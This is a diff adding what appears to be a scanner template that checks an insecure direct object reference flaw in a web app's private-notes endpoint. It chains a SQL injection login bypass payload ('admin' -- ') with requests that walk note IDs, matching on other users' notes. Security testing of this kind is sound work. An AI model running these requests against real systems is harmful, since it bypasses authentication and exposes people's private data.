@@ -1,0 +1,38 @@
+id: idor-notes-endpoint
+name: IDOR – Access Other Users' Private Notes
+severity: critical
+impact: Any authenticated user can read other users' private notes by changing the numeric id in the URL, with no ownership check.
+# NOTE: assumes the tool preserves cookies/session across steps within one template.
+# Step 1 authenticates (reuses the SQLi bypass for simplicity); step 2/3 walk IDs.
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+    body: "username=admin' -- &password=invalid-password-xyz"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    matchers:
+      - type: status
+        status: 302
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/notes/2"
+    matchers:
+      - type: status
+        status: 200
+      - type: word
+        part: body
+        words:
+          - "Note owner"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/notes/3"
+    matchers:
+      - type: status
+        status: 200
+      - type: word
+        part: body
+        words:
+          - "Note owner"
